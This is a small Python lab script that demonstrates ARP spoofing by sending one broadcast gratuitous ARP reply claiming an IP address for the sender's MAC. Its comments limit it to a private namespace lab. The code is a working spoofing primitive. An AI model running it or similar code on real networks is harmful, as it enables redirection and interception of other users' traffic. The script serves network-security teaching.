# Python 3.10, standard library only, Linux. Run inside the isolated lab only:
#   ip netns exec attacker python3 arp-cache-demo.py <victim_ip> <ip_to_claim>
# Sends ONE unsolicited ("gratuitous") ARP reply telling the victim that <ip_to_claim>
# is at this host's MAC address, to demonstrate why unauthenticated ARP lets any host on
# a segment redirect traffic. This is for the ARP spoofing note (../README.md) and must
# only be run against documentation addresses in a private namespace lab you own.
import socket
import struct
import sys

victim_ip, claim_ip = sys.argv[1], sys.argv[2]
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("eth0", 0))
my_mac = s.getsockname()[4]

def ip_bytes(addr):
    return bytes(int(x) for x in addr.split("."))

# We do not know the victim's MAC for the demo, so broadcast the reply; a real cache-poison
# would unicast it to the victim. Broadcasting is enough to show the cache changing.
victim_mac = b"\xff\xff\xff\xff\xff\xff"
eth = victim_mac + my_mac + b"\x08\x06"                      # EtherType ARP
arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)             # Ethernet/IPv4, opcode 2 = reply
arp += my_mac + ip_bytes(claim_ip)                          # sender = us, claiming claim_ip
arp += victim_mac + ip_bytes(victim_ip)                     # target = victim
s.send(eth + arp)
print(f"sent gratuitous ARP: {claim_ip} is-at {':'.join(f'{b:02x}' for b in my_mac)} (to {victim_ip})")
